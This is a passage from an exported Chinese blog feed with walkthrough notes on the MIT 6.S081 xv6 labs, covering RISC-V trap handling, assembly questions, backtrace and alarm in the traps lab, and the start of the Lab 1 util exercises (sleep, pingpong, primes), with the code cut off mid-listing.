class="number">96</span>(a0) # saved register</span><br><span class="line">        ld <span class="built_in">s1</span>, <span class="number">104</span>(a0)</span><br><span class="line">        ld <span class="built_in">a1</span>, <span class="number">120</span>(a0)  # a0-a7是<span class="meta">function</span> arguements，函数参数</span><br><span class="line">        ld <span class="built_in">a2</span>, <span class="number">128</span>(a0)</span><br><span class="line">        ld <span class="built_in">a3</span>, <span class="number">136</span>(a0)</span><br><span class="line">        ld <span class="built_in">a4</span>, <span class="number">144</span>(a0)</span><br><span class="line">        ld a5, <span class="number">152</span>(a0)</span><br><span class="line">        ld a6, <span class="number">160</span>(a0)</span><br><span class="line">        ld a7, <span class="number">168</span>(a0)</span><br><span class="line">        ld <span class="built_in">s2</span>, <span class="number">176</span>(a0) # saved registers</span><br><span class="line">        ld <span class="built_in">s3</span>, <span class="number">184</span>(a0) </span><br><span class="line">        ld <span class="built_in">s4</span>, <span class="number">192</span>(a0)</span><br><span class="line">        ld <span class="built_in">s5</span>, <span class="number">200</span>(a0)</span><br><span class="line">        ld <span class="built_in">s6</span>, <span class="number">208</span>(a0)</span><br><span class="line">        ld <span class="built_in">s7</span>, <span class="number">216</span>(a0)</span><br><span class="line">        ld <span class="built_in">s8</span>, <span class="number">224</span>(a0)</span><br><span class="line">        ld <span class="built_in">s9</span>, <span class="number">232</span>(a0)</span><br><span class="line">        ld <span class="built_in">s10</span>, <span class="number">240</span>(a0)</span><br><span class="line">        ld <span class="built_in">s11</span>, <span class="number">248</span>(a0)</span><br><span class="line">        ld t3, <span class="number">256</span>(a0)  # 临时寄存器</span><br><span class="line">        ld t4, <span class="number">264</span>(a0)</span><br><span class="line">        ld t5, <span class="number">272</span>(a0)</span><br><span class="line">        ld t6, <span class="number">280</span>(a0)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># restore user a0, and save TRAPFRAME in sscratch</span></span><br><span class="line">  <span class="comment"># csrrw 是同时读写的原子操作，将sscratch的值写入a0，将a0写入sscratch</span></span><br><span class="line">  <span class="comment"># csrrw 这里的效果是将sscratch和a0两个寄存器的值交换（原子的）</span></span><br><span class="line">        csrrw a0, sscratch, a0</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># return to user mode and user pc.</span></span><br><span class="line">        <span class="comment"># usertrapret() set up sstatus and sepc.</span></span><br><span class="line">        <span class="comment"># sert 从S MODE（内核态）返回用户态，将PC的值设置为SEPC</span></span><br><span class="line">        sret</span><br></pre></td></tr></table></figure>

<p>除了上面的usertrap，还有内核态引发的trap</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// interrupts and exceptions from kernel code go here via kernelvec,</span></span><br><span class="line"><span class="comment">// on whatever the current kernel stack is.</span></span><br><span class="line"><span class="type">void</span> </span><br><span class="line"><span class="title function_">kerneltrap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> which_dev = <span class="number">0</span>;</span><br><span class="line">  uint64 sepc = r_sepc();</span><br><span class="line">  uint64 sstatus = r_sstatus();</span><br><span class="line">  uint64 scause = r_scause();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>((sstatus &amp; SSTATUS_SPP) == <span class="number">0</span>)</span><br><span class="line">    panic(<span class="string">&quot;kerneltrap: not from supervisor mode&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(intr_get() != <span class="number">0</span>)</span><br><span class="line">    panic(<span class="string">&quot;kerneltrap: interrupts enabled&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((which_dev = devintr()) == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;scause %p\n&quot;</span>, scause);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sepc=%p stval=%p\n&quot;</span>, r_sepc(), r_stval());</span><br><span class="line">    panic(<span class="string">&quot;kerneltrap&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// give up the CPU if this is a timer interrupt.</span></span><br><span class="line">  <span class="keyword">if</span>(which_dev == <span class="number">2</span> &amp;&amp; myproc() != <span class="number">0</span> &amp;&amp; myproc()-&gt;state == RUNNING)</span><br><span class="line">    yield();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// the yield() may have caused some traps to occur,</span></span><br><span class="line">  <span class="comment">// so restore trap registers for use by kernelvec.S&#x27;s sepc instruction.</span></span><br><span class="line">  w_sepc(sepc);</span><br><span class="line">  w_sstatus(sstatus);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还有一个trap就是时钟，这个东西做过单片机的应该非常熟悉，就是用来做时钟嘀嗒的（ticks）。一般板子上有晶振等东西产生时钟信号，然后在固定的时间每次都出发一个时钟中断，用来做基准时间。（在linux里面就是会变成我们熟悉的那个jiffies）<br>这个比较特殊，直接用的比较少，不多说了。</p>
<p>详见<code>kernel/kernelvec.S</code>中的timervec函数。需要注意的是这个玩意虽然也算作interrupt，但是它是不归中断处理函数管的。我们在一些spinlock等操作关中断的时候<code>intr_off</code>是不会把时钟中断也关掉的。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">clockintr</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  acquire(&amp;tickslock);  <span class="comment">// 自旋锁</span></span><br><span class="line">  ticks++;</span><br><span class="line">  wakeup(&amp;ticks);</span><br><span class="line">  release(&amp;tickslock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此外还有来自设备的trap，就是别的系统习惯成为外部中断（external interrupt）的东西，定义在<code>kernel/trap.c</code>的<code>devintr</code>函数，这个后面说道驱动的时候再讲。</p>
<p>ps：外部中断的优先级是很高的，比syscall等其他的trap都高</p>
<h2 id="Lab"><a href="#Lab" class="headerlink" title="Lab"></a>Lab</h2><h3 id="RISC-V-assembly-easy"><a href="#RISC-V-assembly-easy" class="headerlink" title="RISC-V assembly (easy)"></a>RISC-V assembly (easy)</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">g</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> x+<span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> g(x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, f(<span class="number">8</span>)+<span class="number">1</span>, <span class="number">13</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">int</span> g(int x) &#123;</span><br><span class="line">   <span class="number">0</span>:  <span class="number">1141</span>                	addi	<span class="built_in">sp</span>,<span class="built_in">sp</span>,-<span class="number">16</span></span><br><span class="line">   <span class="number">2</span>:  e422                	sd	<span class="built_in">s0</span>,<span class="number">8</span>(<span class="built_in">sp</span>)</span><br><span class="line">   <span class="number">4</span>:  <span class="number">0800</span>                	addi	<span class="built_in">s0</span>,<span class="built_in">sp</span>,<span class="number">16</span></span><br><span class="line">  return x+<span class="number">3</span><span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">   <span class="number">6</span>:  <span class="number">250</span>d                	addiw	a0,a0,<span class="number">3</span></span><br><span class="line">   <span class="number">8</span>:  <span class="number">6422</span>                	ld	<span class="built_in">s0</span>,<span class="number">8</span>(<span class="built_in">sp</span>)</span><br><span class="line">   a:  <span class="number">0141</span>                	addi	<span class="built_in">sp</span>,<span class="built_in">sp</span>,<span class="number">16</span></span><br><span class="line">   c:  <span class="number">8082</span>                	ret</span><br><span class="line"></span><br><span class="line"><span class="number">000000000000000</span>e &lt;f&gt;:</span><br><span class="line"></span><br><span class="line"><span class="symbol">int</span> f(int x) &#123;</span><br><span class="line">   e:  <span class="number">1141</span>                	addi	<span class="built_in">sp</span>,<span class="built_in">sp</span>,-<span class="number">16</span></span><br><span class="line">  <span class="number">10</span>:  e422                	sd	<span class="built_in">s0</span>,<span class="number">8</span>(<span class="built_in">sp</span>)</span><br><span class="line">  <span class="number">12</span>:  <span class="number">0800</span>                	addi	<span class="built_in">s0</span>,<span class="built_in">sp</span>,<span class="number">16</span></span><br><span class="line">  return g(x)<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">  <span class="number">14</span>:  <span class="number">250</span>d                	addiw	a0,a0,<span class="number">3</span></span><br><span class="line">  <span class="number">16</span>:  <span class="number">6422</span>                	ld	<span class="built_in">s0</span>,<span class="number">8</span>(<span class="built_in">sp</span>)</span><br><span class="line">  <span class="number">18</span>:  <span class="number">0141</span>                	addi	<span class="built_in">sp</span>,<span class="built_in">sp</span>,<span class="number">16</span></span><br><span class="line">  <span class="number">1</span>a:  <span class="number">8082</span>                	ret</span><br><span class="line"></span><br><span class="line"><span class="number">000000000000001</span>c &lt;main&gt;:</span><br><span class="line"></span><br><span class="line"><span class="symbol">void</span> main(void) &#123;</span><br><span class="line">  <span class="number">1</span>c:  <span class="number">1141</span>                	addi	<span class="built_in">sp</span>,<span class="built_in">sp</span>,-<span class="number">16</span></span><br><span class="line">  <span class="number">1</span>e:  e406                	sd	ra,<span class="number">8</span>(<span class="built_in">sp</span>)</span><br><span class="line">  <span class="number">20</span>:  e022                	sd	<span class="built_in">s0</span>,<span class="number">0</span>(<span class="built_in">sp</span>)</span><br><span class="line">  <span class="number">22</span>:  <span class="number">0800</span>                	addi	<span class="built_in">s0</span>,<span class="built_in">sp</span>,<span class="number">16</span></span><br><span class="line">  printf(<span class="string">&quot;%d %d\n&quot;</span>, f(<span class="number">8</span>)+<span class="number">1</span>, <span class="number">13</span>)<span class="comment">;</span></span><br><span class="line">  <span class="number">24</span>:  <span class="number">4635</span>                	li	<span class="built_in">a2</span>,<span class="number">13</span></span><br><span class="line">  <span class="number">26</span>:  <span class="number">45</span>b1                	li	<span class="built_in">a1</span>,<span class="number">12</span></span><br><span class="line">  <span class="number">28</span>:  <span class="number">00000517</span>          	auipc	a0,<span class="number">0x0</span></span><br><span class="line">  <span class="number">2</span>c:  <span class="number">7</span>a050513          	addi	a0,a0,<span class="number">1952</span> # <span class="number">7</span><span class="built_in">c8</span> &lt;malloc+<span class="number">0xe8</span>&gt;</span><br><span class="line">  <span class="number">30</span>:  <span class="number">00000097</span>          	auipc	ra,<span class="number">0x0</span></span><br><span class="line">  <span class="number">34</span>:  <span class="number">5</span>f8080e7          	jalr	<span class="number">1528</span>(ra) # <span class="number">628</span> &lt;printf&gt;</span><br><span class="line">  exit(<span class="number">0</span>)<span class="comment">;</span></span><br><span class="line">  <span class="number">38</span>:  <span class="number">4501</span>                	li	a0,<span class="number">0</span></span><br><span class="line">  <span class="number">3</span>a:  <span class="number">00000097</span>          	auipc	ra,<span class="number">0x0</span></span><br><span class="line">  <span class="number">3</span>e:  <span class="number">274080</span>e7          	jalr	<span class="number">628</span>(ra) # <span class="number">2</span>ae &lt;exit&gt;</span><br></pre></td></tr></table></figure>

<p>给你一个<code>call.c</code>，然后<code>make fs.img</code>之后会生成一个<code>call.asm</code>，下面问了你几个汇编的问题（然而我懒，我直接掏出gdb回答）</p>
<p>这个简单，翻手册就完事了</p>
<blockquote>
<p>Which registers contain arguments to functions? For example, which register holds 13 in main’s call to printf?</p>
</blockquote>
<p>a0-a7这些a开头的呗，没啥好说的。第二问， 我们直接打开<code>call.asm</code>，然后找到<code>main</code>函数，发现main函数第45行赫然写着<code>li a2,13</code> 那就是a2呗。</p>
<p>（这直接<code>cat user/call.asm | rg 13</code>搜索13不就好了, 逃）</p>
<blockquote>
<p>Where is the call to function f in the assembly code for main? Where is the call to g? (Hint: the compiler may inline functions.)</p>
</blockquote>
<p>我一开始傻乎乎的找调用没找到，一看提示才发现直接内联了。第46行，<code>li a1,12</code>，紧挨刚才那个13，f(8)+1 &#x3D; 8 + 3 + 1 &#x3D; 12，这个12就是了。（你比编译器聪明系列</p>
<blockquote>
<p>At what address is the function printf located?</p>
</blockquote>
<p>就是pc的address，就是ra寄存器的值呗，gdb看一下就知道了。算了算了不偷懒了，看一下汇编，接着刚才的12向下面找，</p>
<p>查手册发现<code>auipc rd, immediate</code>，是左移12 immediate立即数加到rd上<br>jalr指令： <code>jalr rd, offset(rs1)</code>， 把 pc 设置为 x[rs1] + sign-extend(offset),把计算出的地址的最低有效位设为 0,并将原 pc+4的值写入 f[rd]。rd 默认为 x1。 大概就是跳转到rs1, 然后将下一条指令（pc+4）保存到rd里面。</p>
<p>auipc和jalr这一对指令就相当于jal跳转，参见stackoverflow的这个问题<span class="exturl" data-url="aHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvNDM5NTY2MTIvdW5kZXJzdGFuZGluZy10aGUtYXVpcGNqYWxyLXNlcXVlbmNlLXVzZWQtZm9yLWZ1bmN0aW9uLWNhbGxz">Understanding the auipc+jalr sequence used for function calls<i class="fa fa-external-link-alt"></i></span>  </p>
<p>说人话就是<code>jalr	1528(ra) # 628 &lt;printf&gt;</code>，在jalr这个无条件跳转的时候，将printf的pc的值（628）放到了ra里面</p>
<p>答案就是628</p>
<blockquote>
<p>Run the following code.<br>unsigned int i &#x3D; 0x00646c72;<br>printf(“H%x Wo%s”, 57616, &amp;i);</p>
<p>What is the output? </p>
</blockquote>
<p>这一看就是hello, world啦</p>
<p>结果<code>HE110 World</code>。直接查表就好了（唯一的小坑是大小端的问题，我这是小端，所以你还得倒过来查，不过这个坑很隐蔽，因为57616不管是大端还是小端结果都是一样的<code>e110</code>，所以第二问的回答是不需要改57616，i要倒过来，改成<code>0x00726c64</code>）</p>
<blockquote>
<p>In the following code, what is going to be printed after ‘y&#x3D;’? (note: the answer is not a specific value.) Why does this happen?<br>printf(“x&#x3D;%d y&#x3D;%d”, 3);</p>
</blockquote>
<p><code>call.asm</code>是这样，对比<code>printf(&quot;x=%d y=%d&quot;, 3, 4);</code>, 只少了一行<code>li a2，4</code>, 推测这个printf函数打印出的y的值是寄存器a2中的值，由于我们没有赋值所以打印出来是原来的a2</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;x=%d, y=%d&quot;</span>, <span class="number">3</span>);</span><br><span class="line"> <span class="number">8</span>:  <span class="number">458</span>d                	li	a1,<span class="number">3</span></span><br><span class="line"> a:  <span class="number">00000517</span>          	auipc	a0,<span class="number">0x0</span></span><br><span class="line"> e:  <span class="number">79e50513</span>          	addi	a0,a0,<span class="number">1950</span> # <span class="number">7</span>a8 &lt;<span class="built_in">malloc</span>+<span class="number">0xe6</span>&gt;</span><br><span class="line"><span class="number">12</span>:  <span class="number">00000097</span>          	auipc	ra,<span class="number">0x0</span></span><br><span class="line"><span class="number">16</span>:  <span class="number">5f</span>8080e7          	jalr	<span class="number">1528</span>(ra) # <span class="number">60</span>a &lt;<span class="built_in">printf</span>&gt;</span><br></pre></td></tr></table></figure>

<p>运行结果y&#x3D;5301，然后我们用gdb验证一下呗，断点打到<code>file user/_call.c</code>, 然后<code>b mian</code>， 然后<code>info registers</code>发现a2寄存器是5301，好了，问答环节结束，我们看下面的Lab</p>
<p><img src="/6.S081-lab-trap/1651825910.png"></p>
<p>多说一下printf的实现，这个在csapp的第八章里面有讲，大概就是 调用 vspringf 然后调用sys_write, 然后去跟显示驱动打交道</p>
<h3 id="Backtrace-moderate"><a href="#Backtrace-moderate" class="headerlink" title="Backtrace (moderate)"></a>Backtrace (moderate)</h3><p>实现这个方便panic的时候看到backtrace结果，这个搞懂他想让我们干什么就很简单了，我们只要读出fp寄存器然后打印就好了。</p>
<p>怎么读 frame poiner提示已经告诉我们了，编辑<code>kernel/riscv.h</code>:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> uint64</span><br><span class="line"><span class="title function_">r_fp</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  uint64 x;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;mv %0, s0&quot;</span> : <span class="string">&quot;=r&quot;</span> (x) )</span>;</span><br><span class="line">  <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>kernel/printf.c</code>那里加一个backtrace函数，然后输出照抄<code>printint</code>和<code>printptr</code>用consputc就好了。</p>
<p>提示甚至连栈顶和栈底怎么获取都告诉你了（PGROUNDDOWN(fp) and PGROUNDUP(fp)）， 那就直接把这一段地址中间的所有东西打印出来就好了</p>
<h3 id="Alarm-hard"><a href="#Alarm-hard" class="headerlink" title="Alarm (hard)"></a>Alarm (hard)</h3><blockquote>
<p>In this exercise you’ll add a feature to xv6 that periodically alerts a process as it uses CPU time. This might be useful for compute-bound processes that want to limit how much CPU time they chew up, or for processes that want to compute but also want to take some periodic action. More generally, you’ll be implementing a primitive form of user-level interrupt&#x2F;fault handlers; you could use something similar to handle page faults in the application, for example. Your solution is correct if it passes alarmtest and usertests.</p>
</blockquote>
<p>这个也不是很难，有点繁琐。就是添加一个syscall而已，做法跟syscall那个Lab的内容差不多。大概思路就是先trap进内核态看中断然后返回用户态打印，搞清楚流程照着做就行了。</p>
<p>保存和恢复寄存器这个我一开始是照抄uservec,全部保存的，后来看到Lab的Hints, 又看了一遍讲义</p>
<blockquote>
<p>Your solution will require you to save and restore registers—what registers do you need to save and restore to resume the interrupted code correctly? (Hint: it will be many).</p>
</blockquote>
<p>这里只要保存那些caller寄存器就可以了，像s开头的callee寄存器可以不管。Caller寄存器需要调用者主动保存，不然会被函数返回值覆盖（比如临时寄存器），Callee寄存器在函数调用的过程中不需要调用者保存，会由被调用者保存 。</p>
<p><img src="/6.S081-lab-trap/1651827112.png"></p>
<p>只保存和恢复这些就可以了（注意sp寄存器也是callee寄存器）</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">sd</span> ra, <span class="number">40</span>(a0)</span><br><span class="line"><span class="symbol">sd</span> gp, <span class="number">56</span>(a0)</span><br><span class="line"><span class="symbol">sd</span> tp, <span class="number">64</span>(a0)</span><br><span class="line"><span class="symbol">sd</span> t0, <span class="number">72</span>(a0)</span><br><span class="line"><span class="symbol">sd</span> t1, <span class="number">80</span>(a0)</span><br><span class="line"><span class="symbol">sd</span> t2, <span class="number">88</span>(a0)</span><br><span class="line"><span class="symbol">sd</span> <span class="built_in">a1</span>, <span class="number">120</span>(a0)</span><br><span class="line"><span class="symbol">sd</span> <span class="built_in">a2</span>, <span class="number">128</span>(a0)</span><br><span class="line"><span class="symbol">sd</span> <span class="built_in">a3</span>, <span class="number">136</span>(a0)</span><br><span class="line"><span class="symbol">sd</span> <span class="built_in">a4</span>, <span class="number">144</span>(a0)</span><br><span class="line"><span class="symbol">sd</span> a5, <span class="number">152</span>(a0)</span><br><span class="line"><span class="symbol">sd</span> a6, <span class="number">160</span>(a0)</span><br><span class="line"><span class="symbol">sd</span> a7, <span class="number">168</span>(a0)</span><br><span class="line"><span class="symbol">sd</span> t3, <span class="number">256</span>(a0)</span><br><span class="line"><span class="symbol">sd</span> t4, <span class="number">264</span>(a0)</span><br><span class="line"><span class="symbol">sd</span> t5, <span class="number">272</span>(a0)</span><br><span class="line"><span class="symbol">sd</span> t6, <span class="number">280</span>(a0)</span><br></pre></td></tr></table></figure>

<p>那s0-s11是谁保存的？是被调用者保存的，比如进程的context上下文保存的就是这些callee寄存器，保存和恢复context就是操作这些callee-saved registers。哦，扯远了，到multithreading那个Lab再说</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Saved registers for kernel context switches.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">context</span> &#123;</span></span><br><span class="line">  uint64 ra;</span><br><span class="line">  uint64 sp;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// callee-saved</span></span><br><span class="line">  uint64 s0;</span><br><span class="line">  uint64 s1;</span><br><span class="line">  uint64 s2;</span><br><span class="line">  uint64 s3;</span><br><span class="line">  uint64 s4;</span><br><span class="line">  uint64 s5;</span><br><span class="line">  uint64 s6;</span><br><span class="line">  uint64 s7;</span><br><span class="line">  uint64 s8;</span><br><span class="line">  uint64 s9;</span><br><span class="line">  uint64 s10;</span><br><span class="line">  uint64 s11;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux&amp;Unix</category>
      </categories>
      <tags>
        <tag>6.S081</tag>
        <tag>trap</tag>
      </tags>
  </entry>
  <entry>
    <title>MIT 6.S081 Lab1 Util</title>
    <url>/6.s081-lab-util/</url>
    <content><![CDATA[<p>6.S081是原6.828 lab的简单重置版（萌新青春版），以RISC-V和xv6为例讲OS，Lab还挺有意思的。 </p>
<span id="more"></span>

<p>之前都是学的ARM，之前自己看csapp的时候x86汇编那几章全跳过去了。正好最近刚考完最后一门课，老板留我们7月在学校里打黑工（其实完全没啥事干），可以闲下来做点一直想做但没空的Lab了。</p>
<h2 id="Lab1"><a href="#Lab1" class="headerlink" title="Lab1"></a>Lab1</h2><p>第一个Lab,都很简单，帮你熟悉一下xv6和系统调用。</p>
<p>直接照着提示做就好了。</p>
<p>测试可以用<code>make grade</code>测试全部成绩。测试单个成绩可以用<code>./grade-lab-util xxx</code> 或者<code>make GRADEFLAGS=xxx grade</code></p>
<p>有的时候需要测试打印</p>
<h3 id="Boot-xv6"><a href="#Boot-xv6" class="headerlink" title="Boot xv6"></a>Boot xv6</h3><p>先下载</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git://g.csail.mit.edu/xv6-labs-2020</span><br><span class="line"><span class="built_in">cd</span> xv6-labs-2020</span><br><span class="line">git switch util</span><br></pre></td></tr></table></figure>

<p>然后编译运行xv6。</p>
<h3 id="sleep-easy"><a href="#sleep-easy" class="headerlink" title="sleep(easy)"></a>sleep(easy)</h3><blockquote>
<p>Implement the UNIX program <code>sleep</code> for xv6; your <code>sleep</code> should pause  for a user-specified number of ticks.  A tick is a notion of time  defined by the xv6 kernel, namely the time between two interrupts  from the timer chip.  Your solution should be in the file  <code>user/sleep.c</code>.</p>
</blockquote>
<p>这个也没有什么好说的，让你熟悉一下系统调用。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;usage: sleep &lt;n&gt;\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> n = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">  sleep(n);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后看一下测试（grade），一次通过，简单。</p>
<p><img src="/6.s081-lab-util/image-20210702153759549.png" alt="image-20210702153759549"></p>
<h3 id="pingpong-easy"><a href="#pingpong-easy" class="headerlink" title="pingpong(easy)"></a>pingpong(easy)</h3><blockquote>
<p>Write a program that uses UNIX system calls to ‘’ping-pong’’ a  byte between two processes over a pair of pipes, one for each  direction.  The parent should send a byte to the child;  the child should print “<pid>: received ping”,  where <pid> is its process ID,  write the byte on the pipe to the parent,  and exit;  the parent should read the byte from the child,  print “<pid>: received pong”,  and exit.  Your  solution should be in the file <code>user/pingpong.c</code>.</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> parent[<span class="number">2</span>];</span><br><span class="line">  <span class="type">int</span> child[<span class="number">2</span>];</span><br><span class="line">  <span class="type">int</span> p = pipe(parent);</span><br><span class="line">  <span class="type">int</span> c = pipe(child);</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(p == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;error create pipe parent&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(c == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;error create pipe child&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fork() == <span class="number">0</span>)  <span class="comment">//child process, fork = 0</span></span><br><span class="line">  &#123;</span><br><span class="line">    close(parent[<span class="number">1</span>]); <span class="comment">//close write of parent</span></span><br><span class="line">    close(child[<span class="number">0</span>]); <span class="comment">//close read of child</span></span><br><span class="line">    read(parent[<span class="number">0</span>], buf, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d: received p%sng\n&quot;</span>, getpid(), buf);</span><br><span class="line">    write(child[<span class="number">1</span>], <span class="string">&quot;o&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    close(child[<span class="number">1</span>]); <span class="comment">//close write of child</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fork() &gt; <span class="number">0</span>)  <span class="comment">//parent process, fork &gt; 0</span></span><br><span class="line">  &#123;</span><br><span class="line">    close(parent[<span class="number">0</span>]); <span class="comment">//close read of parent</span></span><br><span class="line">    close(child[<span class="number">1</span>]);  <span class="comment">//close write of child</span></span><br><span class="line">    write(parent[<span class="number">1</span>], <span class="string">&quot;i&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    close(parent[<span class="number">1</span>]); <span class="comment">//close write of parent</span></span><br><span class="line">    read(child[<span class="number">0</span>], buf, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d: received p%sng\n&quot;</span>, getpid(), buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>熟悉一下fork和管道呗。</p>
<p>一开始传的是”ping”, “pong”，各占四个byte，又读了一遍题发现这里只让用1个byte，注意到ping和pong只差一个字母，那就传i和o好了。</p>
<p>这个小玩意本身没什么难的，已经对c完全手生的我愣是做了一个多小时。pipe的0是读，1是写，一开始我搞反了，下午上一个水课的时候又困又饿，调了半个小时百思不得其解。这个Lab几个作业里面做的最失败的一个（没想到竟然栽在一个easy上了），写了一点注释整理了好几次思路才pass。</p>
<p><img src="/6.s081-lab-util/1625234931.png"></p>
<h3 id="primes"><a href="#primes" class="headerlink" title="primes"></a>primes</h3><blockquote>
<p>Write a concurrent version of prime sieve using pipes. This idea is due to Doug McIlroy, inventor of Unix pipes. The picture halfway down <span class="exturl" data-url="aHR0cDovL3N3dGNoLmNvbS9+cnNjL3RocmVhZC8=">this page<i class="fa fa-external-link-alt"></i></span> and the surrounding text explain how to do it. Your solution should be in the file <code>user/primes.c</code>.</p>
</blockquote>
<p>素数筛，这个之前看go语言圣经的经典例子。 扔给你的这篇论文<span class="exturl" data-url="aHR0cHM6Ly9zd3RjaC5jb20vfnJzYy90aHJlYWQv">Bell Labs and CSP Threads<i class="fa fa-external-link-alt"></i></span> 扯了一下CSP模型的，你看这作者Russ Cox，霍，这不是go的…..再一看素数筛、共享内存、CSP模型介绍、  后面还提了一嘴go，引用里一堆Robe Pike等熟悉的名字。写过go的孩子是不是有一股我们在哪里见过的感觉……</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// char prime[MAXN];</span></span><br><span class="line">  <span class="comment">// menset(prime, 1, sizeof(prime));</span></span><br><span class="line">  <span class="type">int</span> p[<span class="number">2</span>];</span><br><span class="line">  pipe(p);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fork() &lt; <span class="number">0</span>) <span class="comment">//children process</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;fork error\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span 